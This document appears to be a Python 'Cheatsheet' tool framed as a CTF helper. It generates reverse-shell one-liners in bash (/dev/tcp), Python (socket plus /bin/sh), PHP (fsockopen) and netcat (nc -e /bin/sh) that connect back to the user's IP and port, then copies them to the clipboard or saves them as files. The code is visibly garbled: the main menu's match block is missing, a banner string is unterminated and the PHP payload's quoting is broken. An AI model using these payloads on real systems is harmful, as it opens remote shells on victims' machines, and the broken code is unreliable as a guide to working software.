#!/usr/bin/python3
# -*- coding: utf-8 -*-

from re import M
import sys
import os
import pyperclip
from time import sleep
from netifaces import interfaces, ifaddresses, AF_INET

ipadd = "0.0.0.0"
port = "0000"
interf = "N/A"

def main():
    banner = """   ________               __  _____ __              __     __________________
  / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
 / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/       
                                                                             """
    print(banner)
    print('<------------------------------------------------------->')
    print('[*] Welcome to the Cheatsheet')
    print('[*] This tool is made to help you through the process of CTFs')
    print('[*] You can use this tool to create a reverse shell')
    print("")
    print("+-------------------------------------+")
    print("|[1] Create Reverse Shells            |")
    print("|                                     |")
    print("|[2] Netcat Connection                |")
    print("|                                     |")
    print("|[3] Set Interface IP  (IMPORTANT)    |")
    print("+-------------------------------------+")
    print("")
    print("[!] Local IP : " + ipadd)
    print("[!] Interface : " + interf) 
    choice = input('\n[*] Enter your choice : ')
            revershell()
            netcat()
        case '3':
            setIp()
            backtomain()




def getIp(interface):
    ipInt = ifaddresses(interface)[AF_INET][0]['addr']
    return ipInt

def setIp():
    interface = input('[*] Enter your interface : ')
    getIp(interface)
    globals()['ipadd'] = getIp(interface)
    globals()['interf'] = interface

def backtomain():
    print('\n[*] Go back to main')
    sleep(1)
    os.system('clear')
    main()


def revershell():
    os.system('clear')
    banner = """______                             _____ _          _ _ 
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
<------------------------------------------------------->
    print(banner)
    c_rs = input('\n[*] Enter your choice : ')
    match c_rs:
        case '1':
            bash()
        case '2':
            python()
        case '3':
            php()
        case '4':
            nc()
        case '6':
            backtomain()

def bash():
    os.system('clear')
    banner = """______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
<------------------------------------------------------->
[*] Welcome to the bash reverse shell
"""
    print(banner)
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        bash()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'
    print("[*] Your shell is created")
    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.sh"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()

def python():
    os.system('clear')
    banner = """______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
<------------------------------------------------------->
[*] Welcome to the python reverse shell
"""
    print(banner)
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        python()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ipadd + '",' + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    print("[*] Your shell is created")
    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.py"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()

def php():
    os.system('clear')
    banner = """______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
<------------------------------------------------------->
[*] Welcome to the php reverse shell
"""
    print(banner)
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        php()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = "php -r '$sock=fsockopen(" + ipadd + "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
    print("[*] Your shell is created")
    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.php"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()

def nc():
    os.system('clear')
    banner = """______                             _____ _          _ _
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
<------------------------------------------------------->
[*] Welcome to the netcat reverse shell
"""
    print(banner)
    port1 = "1234"
    if ipadd == "0.0.0.0":
        print("[!] You need to set your interface ip")
        setIp()
        nc()
    else:
        port = input('[*] Enter your port (Default : 1234) : ')
        if port == '':
            port = port1
        else:
            globals()['port'] = port
    print("\n[*] Your shell is creating...")
    sleep(1)
    shell = "nc -e /bin/sh " + ipadd + " " + port
    print("[*] Your shell is created")
    choice = input('\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
    match choice:
        case 'c':
            pyperclip.copy(shell)
            print("\n[*] Your shell is copied to Clipboard")
            sleep(1)
            backtomain()
        case 'f':
            file = "shell.nc"
            with open(file, "w") as f:
                f.write(shell)
            print("\n[*] Your shell is exported as " + file)
            sleep(1)
            backtomain()

def netcat():
    os.system('clear')
    banner = """
███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
<------------------------------------------------------->"""
    print(banner)

main()
